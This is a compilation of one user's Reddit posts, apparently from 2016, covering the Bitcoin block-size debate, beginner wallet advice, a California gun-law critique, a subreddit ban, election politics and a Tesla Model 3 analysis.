4. Select the Always use classic classic does not mean that later, if the core in a subsequent compatible version adds support for the classic, the miners can then select the core;  
5, core and classic are open source projects, developers fate is freedom, when the miners selected classic, I believe there will be many core developers turn to classic provides code;  
6, the battle line expansion, isolation witness, 2M hard bifurcation debate lightning network has been trouble for too long, please do not argue with me here their advantages and disadvantages, and I do not want to waste time on these topics and the energy;  
7, one of the core design of bitcoin miner is considered the future direction of the force decided to Bitcoin, "talk harm the country", the expansion of the dispute has been debated for too long, continue to argue it is empty. "Hard work and prosperous," better than a perfect plan executed powerful miners was time to act to end this dispute it! </TEXT>

<TEXT>  I can understand the concern if thats the case, however I'd hope that people serving in such important positions were mentally stable to begin with.

Perhaps, or perhaps not, they were mentally stable to begin with, but as someone slowly but surely completely loses their mind over the course of their service, are they really going to go see a doctor when doing so could very easily end their career and ability to feed their children, especially when they know that they're too far 'gone crazy' or 'institutionalized' in their service to got a comparable job outside of their current service? </TEXT>

<TEXT> [Copy/paste I made from a while back about how as of Januray 1st, 2016, the state of California can confiscate virtually anybody's weapons for virtually any reason](https://www.reddit.com/r/news/comments/3yz24k/a_california_gun_statute_going_into_effect_on_1/cyikf70?context=1):

I went through [the new law](https://leginfo.legislature.ca.gov/faces/billNavClient.xhtml?bill_id=201320140AB1014) and picked out specific portions that I feel are an extreme threat to any free society:

Section 18155 details grounds for issuing an "ex parte gun violence restraining order":

(E) A conviction for any offense listed in Section 29805."

[Section 29805](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=PEN sectionNum=29805.) is a fairly long list of misdemeanors. I don't believe that any misdemeanor should allow the government to take your weapons.

(2) In determining whether grounds for a gun violence restraining order exist, the court may consider any other evidence of an increased risk for violence, including, **but not limited to**, evidence of any of the following:

Notice the "but not limited to" part. They're basically granting themselves authority to consider anything and everything they want.

(C) Any prior **arrest** of the subject of the petition for a felony offense.

Note that it says "arrest", not conviction. In my opinion, that is insane. Even if it said "conviction", why would non-violent felonies be considered grounds for confiscation?

(F) Documentary evidence, including, but not limited to, police reports and records of convictions, of either recent criminal offenses by the subject of the petition that involve controlled substances or alcohol or ongoing abuse of controlled substances or alcohol by the subject of the petition.

Got caught smoking cannabis? No guns for you. Also, they provide no explicit definition (or reference to an explicit definition) of "ongoing abuse of controlled substances or alcohol".

(G) Evidence of recent acquisition of firearms, ammunition, or other deadly weapons.

Bought a weapon recently? That's grounds for confiscation!

Further excessive use of the phrase "including, but not limited to" throughout the bill.

From section 18150:

 (a) (1) An immediate family member of a person or a law enforcement officer may file a petition requesting that the court issue an ex parte gun violence restraining order enjoining the subject of the petition from having in his or her custody or control, owning, purchasing, possessing, or receiving a firearm or ammunition.

I think there is significant potential for abuse here. Have any issues with an immediate family member or a law enforcement officer (or perhaps a government that you've angered)? Hope they don't use this against you. Oh, but you're a totally sane person, right? Well, you haven't shaved in a week and they knock on your door at 6 AM while you were still sleeping, so you're all groggy. Your rank-and-file policeman interprets your lack of a clean shave and your grogginess as evidence that you must obviously be mentally unstable, and they search your place and seize anything they don't approve of. Nonsense like this happens; for many it's not just some what-if scenario.

Part (b) (1) of section 18155 appears to be things that most people would consider legitimate in justifying a confiscation, but then part (b) (2) immediately goes on to grant themselves the ability to consider significantly less legitimate things, and they explicitly say that they can consider whatever they want with the "but not limited to" part.

Domestic shootings are horrific and tragic, but I am not overlooking them in my opposition to bills and laws like this. Loosely worded legislation regarding Constitutional rights presents a monumental threat to a free society. I do not pretend to know what kind of government or society we might have 10, 50, 100, or more years from now, or what intentions that government might have.

Please excuse the sensationalism here: Ask Anne Frank and her family (or about 100,000 other Dutchmen) how they feel about Dutch census data, which included religious affiliation and was initially collected for non-malicious purposes.

To me, the right to bear arms has very little to do with personal defense. The 2nd Amendment was not included in the Constitution to protect against individual theives or attackers or because people go hunting. It was included, 224 years ago, because they recognized the potential threat of a tyrannical government. It is (again, excuse the dramatic tone) a doomsday provision that explicitly states the right of the American people to stand up against a government that has stripped them of most or all of their other rights. I certainly do not know what our government will turn into or attempt to do over the course of the next 224 years.

Arguably, the intent or 'spirit' of this law is good, but ultimately that does not matter. </TEXT>

<TEXT> Yes I understand we have this difference but we can be more specific. Maximum utility can mean different things. You are referring to maximum use as a currency OR to the maximum use cases. There can also be "What is the optimal use?" Which might not be as a currency and might only be one thing and not many things.

Yes it is undecided at this point.

It might be that having only the big players use it is optimal, and then the users you speak of will seek alternate options.

I'm not totally disagreeing here, even if I do still think it's a bad idea to limit use cases of Bitcoin, but what I definitely *am* saying is that while the Bitcoin community bickers about what they think the optimal use cases and block size of Bitcoin should be, other coins are making massive strides and innovations in areas like smart contracts, DAOs, and more.

What I think is important is to think about the existing fiats and how governments will be forced to print higher quality money in order for it to stay relevant.

Exactly this, and it applies to incumbent cryptocurrencies just as well. </TEXT>

<TEXT>  I think it can be shown that bitcoin is far better off without attempting to keep bitcoin cheap to transact. I don't think this is best for the world.
 
 
 
 the important point to consider is how many users will be driven to alternatives as Bitcoin transaction fees rise.
 
 
 
 this presupposes that number of users is what is important. And this presupposes bitcoin's optimal use is as a coffee money (or at least cheap to transact). 

I think this is where I see things fundamentally differently.

I think that driving away users for *any* use case is a bad idea and damages the overall utility and value of Bitcoin. I think that users will find maximum value in cryptocurrencies that provide maximum utility. In short, I think Bitcoin is being destroyed in both utility and value as long as its transaction throughput continues to be intentionally limited, and that until something changes, users and value will continue flowing out of Bitcoin and into altcoins.

Obviously, others do not feel this way. Only time will tell who is correct, or who is correct to what degrees. </TEXT>

<TEXT> I feel like this is a false dichotomy, it doesn't need to be either or, and plus, people are still free to use it however they want if they pay the fees, even if they want to pay a huge fee just to buy a coffee.

I think it's a spectrum and the important point to consider is how many users will be driven to alternatives as Bitcoin transaction fees rise. </TEXT>

<TEXT> I'm increasing the market value of other cryptocurrencies and decreasing the market value of Bitcoin.

Same end effect ultimately.

It makes me sad because I've been so excited about Bitcoin, but it's clear that Blockstream has hijacked Bitcoin and is driving it into the ground, whether or not that's their intent.

Bitcoin may fail, but cryptocurrency will not.

MOD:

Hi, you've been banned for repeatedly posting opinion/analysis pieces and editorialized articles. The new submission page and the sidebar say very clearly that this sub is only for straight news reports. If you agree to follow the rules, we can lift your ban in a week's time. Does that sound fair?

ME:

That's fine.

I will avoid anything that could be considered opinion/analysis.

For what it's worth, I haven't changed any titles, though I do notice that sometimes the title of an article will change later on.

Using my only post in /r/worldnews in the last 96 hours as an example (https://www.reddit.com/r/worldnews/comments/4jc39x/swedish_govt_spends_millions_telling_citizens_to/), the title of my post and the title of the article are exactly the same.

If I'm not understanding anything about the definition of 'editorialized', please let me know.

In any case, thanks for modding and taking the time to talk to me.

MOD:

You can read more about the rules here: /r/worldnews/wiki/rules

In this case by "editorialized" I wasn't referring to the title, but the article.

It's not an opinion piece per se, but the article contains hints at the opinion of the author such as "Yum". It's clearly not a straight news report.

Please respond to this message in a week and we'll lift your ban again.

So posting an article with the word "Yum..." in it appears to be the straw that broke the camel's back.

Guess I'll message them in a week. </TEXT>

I got banned from \/r\/worldnews with no explanation except the following message:

You have been banned from participating in /r/worldnews. You can still view and subscribe to /r/worldnews, but you won't be able to post or comment.

If you have a question regarding your ban, you can contact the moderator team for /r/worldnews by replying to this message.

**Reminder from the Reddit staff**: If you use another account to circumvent this subreddit ban, that will be considered a violation of [the Content Policy](/help/contentpolicy#section_prohibited_behavior) and can result in your account being [suspended](https://reddit.zendesk.com/hc/en-us/articles/205687686) from the site as a whole.

I've only made a single post there in the last 96 hours. (https://www.reddit.com/r/worldnews/comments/4jc39x/swedish_govt_spends_millions_telling_citizens_to/)

I sent them a message 90 minutes ago and no response yet:

Hi, thank you for the notice. Can I get some feedback on this? Anything I can do differently?

Are they doing some sort of a purge or is there a more reasonable explanation? </TEXT>

If you are operating a motor vehicle, you are required to provide a driver's license and, I believe, things like registration and insurance.

I think most states have a clause when you get your driver's license that you also consent to a breathalyzer test if pulled. </TEXT>

<TEXT>  That's why I feel like we've won at least something already. Any possible outcome is good.
 
 
 
* The two party system will implode
 
 
 
* Trump will destroy himself, but humiliate Hillary in the process of doing so, which will be the beginning of the end for career politicians.

The end of the two party system is absolutely my number one issue in presidential politics.

I feel that it is the root cause of corruption and ineffectiveness in our government.

I have been supporting Bernie because he endorses the Alternative Vote (versus First Past The Post), which would significantly weaken the two party system and the stranglehold that the two current parties have over our government.

Trump and Sanders both share their 'the system is rigged' angle, but, as far as I know, Trump has not actually said what he will do to fix that.

If Trump were to commit to switching presidential elections to the Alternative Vote (or perhaps other methods) and getting rid of First Past The Post, I would have to strongly consider voting for him. </TEXT>

<TEXT> The newly provided transcripts denigrate minority suspects with racial slurs and insult colleagues perceived to be gay. The texts ridicule blacks in Ferguson, Missouri, where police shot and killed an unarmed black man.

They discuss a shootout among black men and the shooting of an armed suspect by police. In doing so, they appear to ridicule the shooting death by police in 2014 of a mentally ill man carrying a stun gun officers mistook for a handgun.

They also exchanged photographs with racist captions.

One photo depicts a white man playfully spraying a young black child with a garden hose. The caption calls the boy a racial slur.

There's a photo of smoke rising above San Francisco and guesses are exchanged about the origins of the fire.

"Must be Korean BBQ," quips one.

"I heard was a slave ship!!" quips another. </TEXT>

<TEXT> With great financial freedom comes great financial responsibility.

While I hope things become more user-friendly, there were several mess-ups here:

* Private keys to a significant amount of coin on an online device, rather than a dedicated offline device (it's not 'cold' if it's ever touched the internet).

* Weak password

* Even if if the password wasn't weak, a key logger could capture the password if/when you type it in, so again, an online device is not secure.

I'm genuinely sorry for your loss. Again, while I wish cryptocurrency was more user-friendly, sometimes a lesson has to be learned the hard way. </TEXT>

**I have never seen a case such as this where you would actually livestream a sexual assault,** he said. **Based on the video that I saw it didnt appear for the most part of it that she was attempting to help the victim.** </TEXT>

<TEXT> Canadian rocker Bryan Adams is canceling a performance this week in Mississippi, citing the state's new law that allows religious groups and some private businesses to refuse service to gay couples.

Adams said in a statement Sunday night that he was canceling a show Thursday at the Mississippi Coast Coliseum in Biloxi.

The singer says he can't "in good conscience" perform in a state where "certain people are being denied their civil rights due to their sexual orientation."

The move comes after [Bruce Springsteen and the E Street Band canceled a Sunday show in Greensboro, North Carolina](http://www.cbsnews.com/news/bruce-springsteen-cancels-north-carolina-concert/), because of that state's new law blocking anti-discrimination rules for the LGBT community. </TEXT>

I think there are a large number of voters, including myself, who do not identify with either party, and frankly, are disgusted by both and feel that neither represent their interests.

Hence the popularity of less mainstream politicians like Sanders and Trump.

<TEXT> Thank you for pointing this out.

Please consider reporting it at http://www.cnn.com/feedback/

I made a template for anyone that wishes to use it:

INCORRECT INFORMATION: Wisconsin primary: 5 things to watch (http://www.cnn.com/2016/04/05/politics/election-results-what-to-watch/)

The following is partially incorrect:

"In a memo posted on Medium Monday evening, Mook wrote: "Sanders has to win the four remaining delegate-rich primaries -- New York, Pennsylvania, California, and New Jersey -- with roughly 60% of the vote. To put that in perspective: Sanders has thus far won only two primaries with that margin: Vermont and New Hampshire.""

Sanders has won the following states with that margin:

-New Hampshire

-Minnesota

-Vermont

-Kansas

-Maine

-Idaho

-Utah

-Alaska

-Washington

-Hawaii

EDIT: Upon further review, Idaho and Utah (and Vermont and New Hampshire) are the only states there that are actually primaries. So, still technically incorrect, but not *as* incorrect as I initially thought. </TEXT>

I think what /u/UseMyAdvice is saying is that our standard of living is higher than at any point in history.

I think what /u/StopDropAndBurn is saying is that the "wealth and power gap has never throughout human history been greater than it is now."

IMHO, "we have a higher standard of living now than we have ever had in history" would be more accurate than saying "more fair".

**Summary**

* Tesla revealed the Model 3 and started taking reservations.

* The number of reservations were vastly beyond the expectations of even the most optimistic estimates.

* This puts the rest of the luxury auto industry in a difficult spot.

* I look at sales numbers of the competitors vs. reservations for the Model 3.

Tesla (NASDAQ:TSLA) revealed the Model 3. I placed the order for mine online the second reservations opened up. I was one of 115,000 people to place an order for the car sight unseen. The car was revealed about an hour after I placed my order and saying that it did not disappoint is an understatement.

Tesla Model 3

With Autopilot safety features and supercharging standard, $35,000 starting price, trunk and a frunk and an expected five-star safety rating in all categories, this will be the most compelling car in its segment.

Here is the gas car competition:
		

The pictures show the BMW (OTCPK:BAMXF) 3 Series, Mercedes (OTCPK:DDAIF) C Class and Audi (OTCPK:VLKAY) A4.

Here is the supposed EV Competition - GM's (NYSE:GM) Chevy Bolt. I say supposed because the car is in a different size/class segment.

The similarities end at it being another long-range EV.

None of the competition has the autopilot safety features standard. As an example, to get the equivalent safety features on a BMW you would need to pay an extra $5,400 ($1,700 for their driver assist package which forces other packages on you). Mercedes will charge you at least $3,350 for the features. You are forced to get something more comparable (but in in my opinion still inferior) to the Tesla autopilot to get even the safety features.

None of the competition even has OTA updates. Also the competition has very dated looking interiors compared to the Model 3 Dash:

Historically Tesla has stayed very close to their concept dashboards and I expect the Model 3 to follow suit.

During the Model 3 reveal event, video here, Tesla had a live reservation counter and by 9:30 Pacific time had more than 128,000 reservations. By this afternoon, reservations had climbed to 198,000. Just for comparison, over the first two days the original Apple iPhone sold 270,000 units. So 200,000 reservations for a $35,000 car to be delivered two years from now or more is an impressive feat by any measure.

Here are the US sales for some of the competition in 2015:

* BMW 3 Series 	94,527

* Mercedes C Class 	86,080

* Acura TLX 	47,080

* Audi A4 	31,577

* Total Small Luxury 	611,973

My estimates for lines at US Tesla stores are an average of 500 based on pictures, enthusiast forum posts and local news coverage of lines at Tesla locations nationwide. Tesla has over 100 locations in the US and I estimate more than 50,000 of the initial 115,000 came from the US. I expect Tesla to have more reservations over the next few months from the US than the annual sales of all the competition. Here is a picture of a line of people waiting in the rain to reserve a Model 3.

In January, even before Tesla mentioned this in their Q4 2015 shareholder letter, I wrote about how Model S is taking away serious market share from the competition. I expect the Model 3 to be no different. The sales of the Model 3 will easily surpass all the competition. A few days ago even Audi admitted that Tesla has done everything right. Let's assume reservations slow down and they just double from the current number by the time the Model 3 launches. And let's say that Tesla takes two years to deliver these 400,000 orders. That's an average rate of 200,000/year in 2018 and 2019. And if this is split 50/50 US/International, we have 100,000/year in the US, which represents a 16% market share of the small luxury sedan market. Bigger than any of the competitors and essentially a repeat of the Model S success.

While the first competition for the Model S - the Porsche (OTCPK:POAHF) Mission E - is at least five years away, I expect the first real competition for the Model 3 is at least a decade away. As much as some like to point to the Bolt or upcoming Leaf 2 as Model 3 competitors, they are not in the same segment at all. In fact, unless the Nissan (OTCPK:NSANY) Leaf 2 is exactly like the Nissan IDS Prototype, Nissan has no hope of selling even a fraction of the Model 3 numbers and I say this as a Leaf driver.

I'm not sure what time is considered end of quarter for Tesla (midnight Pacific or midnight Eastern). Assuming midnight Eastern, the Model 3 reservations will have added at least $120 million to Tesla's customer deposits. Tesla customer deposits stood at over $280 million last quarter and that included Signature Model X deposits of over $40,000 each. It is an impressive feat to have a car with only a $1,000 deposit to add a $120 million to the customer deposits.

Just yesterday I had my first Model X sighting and I now await Tesla Q1 results which should point to Model X production going smoothly in addition to the fantastic reception of the Model 3. As more Model Xs hit the road, the rest of the year should be great for Tesla and Tesla stock.

Of course, the Model 3 represents new challenges for Tesla like the completion of the Gigafactory and an order of magnitude of larger volumes than its previous cars. This could lead to delays like we are used to with Tesla. And maybe Model 3 customers will not be as tolerant as previous early adopters. But on the other hand, in the opinion of many (me included), there is just no comparison with anything else. So the likelihood is that people will wait.

In conclusion:

*  The Model 3 exceeded the expectations of both reservation number and standard feature wise.

*  The reception was overwhelmingly positive.

* Tesla is likely to receive US deposits for more than any of the competitions annual sales and I expect Tesla to take market share from all of them as soon as deliveries start.

* Q1 results should point to a great year ahead.

<TEXT> **USMNT players make pointed jokes about Abby Wambachs DUI arrest**

**By Des Bieler**

Alejandro Bedoya, left, and Jozy Altidore, right, are shown in 2013 with one of the USMNTs dual-nationality players, Aron Johannsson. (Hans Punz/Associated Press)

It is not surprising that Abby Wambach is taking some heat for her DUI arrest early Sunday morning. However, it is more than a little eye-opening that some of that heat is emanating from the U.S. mens national team.

However, Wambach, who retired from the womens national team last year after a highly decorated career, could be said to have started it, with comments in December criticizing USMNT Coach Jurgen Klinsmanns extensive use of foreign guys, i.e., players with dual nationalities. That provides the context for this pointed tweet from midfielder Alejandro Bedoya, who has made many appearances with the USMNT.

[Mix Diskerud slams Wambachs comments on dual-citizenship U.S. players]

That tweet was replied to by USMNT forward Jozy Altidore, who took the opportunity to also take a shot at USWNT goalie Hope Solo. Her husband, former NFL player Jerramy Stevens, was arrested for DUI last year, and he and Solo were reportedly driving around in an official U.S. Soccer team van at the time.

Bedoya and Altidore were born in New Jersey, but both are the children of foreign-born parents and thus could have some particular empathy for dual-nationality USMNT players such as Mix Diskerud, Fabian Johnson and Julian Green. However, they might have been expected to show some deference to a U.S. soccer star, particularly at such a painful time for Wambach.

There is another dynamic at play here, though, and that is the federal complaint of wage discrimination recently filed by several USWNT members, including Solo. While aimed at the U.S. Soccer Federation, the players complaint is necessarily based on directly comparing the success of the USWNT on the field and off, including television ratings, to its male counterpart.

Meanwhile, Bedoya wasnt done with his online comments. After taking his own heat from Twitter users who though he was way out of line for jabbing at Wambach, the 28-year-old, who plays for French team FC Nantes, fired off a few more posts.
0wambachC0403

The hashtag, #1N1T, that Bedoya used stands for One Nation, One Team, a social-media campaign that U.S. Soccer began as the USMNT prepared to compete for the 2014 World Cup in Brazil. It has since been applied to the USWNT, as well, but it doesnt feel like the two national squads are feeling any particular unity at the moment. </TEXT>

<TEXT> It's been a while since I've actually used Electrum, but if I remember correctly, once an address has been used, it's sorted into a collapsed 'Used' folder/tab so that you are encouraged to use new addresses.

But if you still want to reuse addresses, you should be able to uncollapse that folder/tab and see all your previously used addresses.

The previously used addresses will still recognize if more coins are sent to them, whether you or someone else sends coins there, and you should have full access to those coins.

Individual addresses should never be deleted, unless you've importing single unique addresses/keys that are not associated with a master seed, but that's a different topic and I'm probably just confusing you with extra information now. </TEXT>

<TEXT> Thank you very much. I really appreciate it.

One question...

 You can trade XRP on many exchanges but you're really trading XRP IOUs and don't hold the XRP in your own wallet (kraken, poloniex, bitstamp). Your XRP in an exchange is like like putting your XRP in a safe in a bank. Sure, you technically own it but you have to ask permission for it. The bank gives you an IOU which you can redeem for your funds.

But can I send XRP out of an exchange to a wallet like GateHub that I control? </TEXT>

<TEXT> Just wondering if it would be worth my while to buy 1 BTC as an investment sort of thing.

Make your own investment decisions.

Also what on earth are faucets and how do they work?  Ive seen some sites seem to give away what i imagine are miniscule amounts but surely that can start to add up over time especially if the BTC price rises at all.

They're sites that give you insanely small amounts of coins. I haven't seen any non-super-shitty faucets in years. A lot of them will 'give' you some insanely small amount of coins for watching a video or solving a captcha, but then they don't let you withdraw unless you accumulate a much larger amount.

Even if you got coins from faucets all day, it would only add up to a few cents a day.

Maybe there's some good faucets out there, but in my experience they're mostly total crap.

If i did go on to buy some, is it easy to then sell them for USD?

Easy enough.

If you buy from places like Coinbase or Circle you should be able to sell back to them. There are other online services too.

You can also find people locally to sell to through sites like LocalBitcoins.com or Mycelium Local Trader. Or go to some Meetups or other places nerds gather and I'm sure you'll find people that want to buy them from you. </TEXT>

<TEXT> Haha, I'm well aware. But people seem to think that 'shadowbanning' only refers to Reddit-wide shadowbanning done by admins.

Subreddit mods can do it (or something very similar) on their specific subs as well, and then everybody shouts at you when you use the word 'shadowban' because 'shadowbanning' is only a Reddit-wide function.

The subreddit specific action sure seems like shadowbanning to me, but maybe there's a better word. </TEXT>

<TEXT>  If I make a payment to one of those I receive the money on the wallet right?

Yes. All the addresses in the wallet belong to you.

Do I need to specify each time a description and an amount or may I skip that part (in the "request" section)?

You do not need to enter a description unless you want to.

Obviously, if you're *sending* coins, you need to enter an amount. But if you're *generating a payment request* for an address, the requested payment amount is optional. </TEXT>

<TEXT> You're welcome!

I'm not too familiar with breadwallet, but in general you can receive bitcoins from others at any time when you are offline (though you won't be able to see it until you get online), but you cannot send bitcoins when you are offline.

You can, however, create a sending transaction when you are offline and then broadcast it once you are online. </TEXT>

<TEXT> I'm of the opinion that any online system is not very secure.

But there's a couple things you can do:

* Put a strong password/encryption key on your wallet to prevent brute-force password guessing on your wallet
* Backup your wallet, either by making a digital copy or by physically writing down your seed words or private keys, to prevent loss
* Don't put more in a wallet than you're willing to lose

If you want real security, cold storage is the way to go, but you may want to save this until you get comfortable with Bitcoin.

 Which is safer/efficient?

As described above, IMO any online system is not very safe.

As far as efficiency, full wallets like Bitcoin Classic and Bitcoin Core are much more heavy duty than lightweight wallets like breadwallet, so I'd say breadwallet is more 'efficient' from a user-experience point of view. </TEXT>

Electrum makes it extremely easy to use new addresses (as in you really don't need to *do* anything), but you can also easily reuse addresses if that's what you want to do.

For the record, I strongly recommend not reusing addresses. </TEXT>

<TEXT> How are you supposed to create these coins, with machines, or can I just use a normal computer?

'You' are not really supposed to create coins, or at least you cannot do so effectively with a normal computer, but you can try if you want. The mining market is dominated by people and companies with Application Specific Integrated Circuits (ASICs) that are much more powerful and efficient than a CPU or GPU in a normal computer.

What is "mining" exactly, and what does it mine?

Mining is a computationally intensive process by which miners put transactions permanently into the blockchain. They are rewarded for doing this by the new bitcoins that are 'mined' and given to them.

Is it expensive to do?

Yes, unless you have cheap electricity or are just doing it on a very small scale as a hobby or learning experience.

If you want to buy bitcoins, I recommend services like Coinbase.com or Circle.com for newbies. You could also meetup with people in person and pay cash through LocalBitcoins.com or Mycelium Local Trader.

For your own Bitcoin 'account', I'd recommend using Electrum on a normal computer, Mycelium on Android, and BreadWallet or AirBitz on IOS.

I hope this helps and I'm happy to answer any other questions. </TEXT>

Just one pointer because it made my eyes hurt: it's very difficult to read the text in the dark blue/purple cells. Maybe use a grayish color that shows up well on both light and dark backgrounds? Or some other color scheme?

<TEXT>  The only problem is that you'll never get the same exposure as being positively portrayed in millions of people's living rooms, as Clinton has had the privilege of doing.
 
 The cable news stations should not only give fair time and fair balance to Sanders, but should disclose their corporate ties which contribute to Clinton's campaign. They should do that every time they mention either of their names.

I've been telling my dad how there's an agenda behind everything on television. He normally doesn't want to hear about it.

But he was bitching recently about a segment on Star Wars that was on Good Morning America (ABC) and that he doesn't give a crap about Star Wars.

I asked him who owns Star Wars and who owns ABC. He correctly answered Disney.

Now he's sort of getting it and grumbles that the news *used* to be mostly just presentation of facts. </TEXT>

<TEXT> Hey man. Thanks for commenting. I have no problem with sidechains. I think they're awesome and I encourage solutions built on top of (or to the side of?) Bitcoin.

Bringing up 'evil Blockstream' doesn't seem totally relevant here, beyond using RootStock as an example of why sidechains are a good thing.

But while we're bringing up unrelated topics, may we continue the conversation we were previously having? (https://np.reddit.com/r/Anarcho_Capitalism/comments/4b06de/request_to_remove_rbitcoin_from_the_sister/d16v5m8?context=3)

vakeraj:
r/btc is such garbage. They merely practice a different for of censorship: downvoting all pro-Core comments or anyone contradicting their Blockstream conspiracy theories to oblivion. Now they're bringing the fight here because many ancaps might not follow the minutiae of the blocksize debate, so they're easily swayed.

subject1230:
Oh look, another BlockstreamCore defender getting downvoted on a non-Bitcoin subreddit.

First /r/technology, now /r/Anarcho_Capitalism.

Those /r/btc sock-puppets and shills are just *EVERYWHERE!*

vakeraj:
This thread was started by a frequent poster at r/btc, and is being brigaded from r/btc.

Also, that thread in r/technology you were referring to was also started by a frequent r/btc poster, and brigaded from there.

Classic supporters mindlessly view this as a war that has to be won, instead of taking a deep breath, stepping back for a moment, and calmly looking at the issue.

subject1230:

<TEXT> The easiest way to support classic is probably to run a full node.

You can download full Classic node software at https://bitcoinclassic.com/ and clicking on the "[Download](https://github.com/bitcoinclassic/bitcoinclassic/releases/tag/v0.12.0cl1)" link that goes to GitHub.

They have builds for Windows, OSX, Linux, and ARMs. I believe the ARM build should work on a Raspberry Pi. </TEXT>

The Lawsky Group specializes in helping companies, boards, and individuals manage their most complex, emergent and dynamic challenges. The firm provides in-depth counsel and strategic advice on financial services regulation, cybersecurity and cyber-risk, new financial technologies, compliance, consumer protection, privacy, anti-money laundering controls, crisis management, and investigations in the banking, insurance and other related industries.

But to answer your question, this (http://www.dfs.ny.gov/consumer/fileacomplaint.htm) is probably what you're looking for. The "General Questions about Financial Services" section might be the most appropriate option. </TEXT>

<TEXT> I do agree that a hard-fork is not backwards compatible and it would take time to deploy.

In that regard, how do you feel about Classic's 28 day activation grace period?

* Is a grace period a good way to help deploy a hard-fork? If not, what are other good options?
* If it is a good option, is 28 days enough? If not, how long would be enough?

Regarding simplicity (or lack thereof), I realize there's a little bit more to increasing the maximum block size than just changing a "1" to a "2", but the impression I've gotten from perusing through the Classic code a little bit back is that it's about 15 more lines of code to make sure everything goes smoothly. Am I misinformed here? (---genuine question, I haven't delved through every single line of code or considered *every* angle).

What hangs me up is seeing something like SegWit (which I have no problem with in itself), which seems to be a fairly fundamental restructuring of the blockchain, being promoted, while changing a "1" to a "2" and about a dozen more lines of supporting code changes being called too complicated. I'm not following the logic there, but maybe I'm missing a part of the picture.

I have to head out right now, but I'll do my best to get back to any responses later tonight.

Thanks for for the discussion. </TEXT>

For the transfer, personally I'd just make a new wallet on the new phone and send the coins over from the old wallet on the old phone because I think it'd be simpler, but transferring the original wallet to the new phone shouldn't be difficult either, especially if you use your 12(?) word seed. </TEXT>

I strongly suspect that if Core were to change:

`static const unsigned int MAX_BLOCK_SIZE = 1000000;`

to

`/** The maximum allowed size for a serialized block, in bytes (network rule) */`
`static const unsigned int MAX_BLOCK_SIZE = 2000000;`

<TEXT> The government itself does not care if the currency is devalued as long as it keeps printing more money for itself.

The population is forced to suffer devaluation of the money they already have because the government keeps printing more money and giving this money to itself.

Simplified Example:

* The total quantity of all Venezuelan Bolivares in existence is 1,000,000.00 Bolivares and the people (not the government) hold all of it.

* The government decides to print 99,000,000.00 more Bolivares and give it to itself.

* The total value in terms of Bolivares is now 100,000,000.00 Bolivares, but the total value of these 100,000,000.00 Bolivares in terms of purchasing power is still the same as the original 1,000,000.00 Bolivares.

* Due to inflation (the printing of 99,000,000.00 Bolivares), the original 1,000,000.00 Bolivares owned by the Venezuelan people is now worth 1% of what it was worth before the printing.

* The Venezuelan government has effectively stolen 99% of the cash value that was previously owned by the Venezuelan people. </TEXT>

<TEXT> Because the Venezuelan government is printing so much money that their currency is rapidly losing value, and the government is forcing 'official' exchange rates that are wildly out of tune with free market exchange rates.

Any other currency that holds value better than the Venezuelan Bolivar is a way out of this for the population.

In particular, Bitcoin and cryptocurrency are useful because they are easy to transport and difficult to detect in transport. </TEXT>

<TEXT> [Manifesto for Agile Software Development](http://agilemanifesto.org/):

**Manifesto for Agile Software Development**

We are uncovering better ways of developing

software by doing it and helping others do it.

Through this work we have come to value:

* Individuals and interactions over processes and tools

* Working software over comprehensive documentation

* Customer collaboration over contract negotiation

* Responding to change over following a plan

That is, while there is value in the items on

the right, we value the items on the left more.

[Open-source software development methods](https://en.wikipedia.org/wiki/Open-source_software_development#Open-source_software_development_methods) (emphasis mine):

It is hard to run an open-source project following a more traditional software development method like the waterfall model, because in these traditional methods it is not allowed to go back to a previous phase. In open-source software development, requirements are rarely gathered before the start of the project; instead they are based on early releases of the software product, as Robbins describes[4]. Besides requirements, often volunteer staff is attracted to help develop the software product based on the early releases of the software. ***This networking effect is essential according to Abrahamsson et al.: if the introduced prototype gathers enough attention, it will gradually start to attract more and more developers. However, Abrahamsson et al. also point out that the community is very harsh, much like the business world of closed-source software: if you find the customers you survive, but without customers you die.[5]***

Alfonso Fuggetta mentions that rapid prototyping, incremental and evolutionary development, spiral lifecycle, rapid application development, and, recently, extreme programming and the agile software process can be equally applied to proprietary and open source software.[6] One open-source development method mentioned by Fuggetta is an agile method called Extreme Programming. ***All the Agile methods are in essence applicable to open-source software development, because of their iterative and incremental character.*** Another Agile method, Internet-Speed Development, is also suitable for open-source software development in particular because of the distributed development principle it adopts. Internet-Speed Development used geographically distributed teams to work around the clock. This method is mostly adopted by large closed-source firms like Microsoft, because only big software firms are able to create distributed development centers in different time zones. Of course if software is developed by a large group of volunteers in different countries, this is being achieved naturally and without the investment needed like with closed-source software development. </TEXT>

This is fantastic! Though he did lose me at:

For my sofa, the relevant digital artifact is the integer 418 in 16-bit unsigned binary notation. Its controller, by definition, is the real number sqrt(pi); a fact that can be trivially ascertained by any cryptographic method. So, the integer 418 is an asset, by definition (2). </TEXT>

<TEXT> Intro (emphasis mine):

It's a mystery that has evaded the best minds in archeology for decades: the unknown fate of a beautiful queen who ruled over ancient Egypt at the height of its power.

But Nefertiti may be hiding in plain sight, [according to a recent theory](http://cnn.com/2015/10/01/africa/nefertiti-tomb-egypt/) that's set the Egyptology world buzzing.

Adding credence to that theory, Egyptian Antiquities Minister Mamdouh El Damati announced Thursday that based on preliminary findings from a radar scan of King Tut's tomb site, ***experts are 90% sure they found two new chambers behind the walls of Tut's resting place***.

 [British archaeologist Nicolas Reeves](http://edition.cnn.com/2015/08/11/africa/nefertiti-tomb-tutankhamun/) speculated in August that Nefertiti was buried in one of those chambers. </TEXT>

<TEXT> * **Strengthen Family Outreach and Engagement**

 Families are the first line of defense in keeping youth safe from violent extremism. High schools should develop outreach and engagement programs that educate families about the 
various forms of violent extremism and ways to identify at-risk youth or concerning behaviors and communications. In fact, many of the most fruitful and positive leads 
reported to authorities have come from concerned family members or community leaders. It is very important that schools engage the students families through PTA or other programs as a vital step to preventing the mobilization of possibly radicalized students.

...

* **Educate Faculty About Bystanders**

Less than half of the individuals witnessing activities or behaviors that can lead to early intervention report their observations to community members or law enforcement. Encouraging increased reporting and intercession by third parties could improve the success of efforts to curb extremist acts in the U.S. </TEXT>

<TEXT> I think it's cool and the site is awesome.

That said, here's feedback from my perspective:

* The 'popup that takes up the whole screen' method really puts me off. My immediate thought is to just close the page because 'screw this' (like I do with Forbes and their welcome screens, Bitcoin.com and their popups, or just obnoxious ads in general).

* The popup also makes me question the credibility of what the popup has to say and the contents of the whole site. "If this site feels the need to force this message upon me, are they just pushing an agenda?"

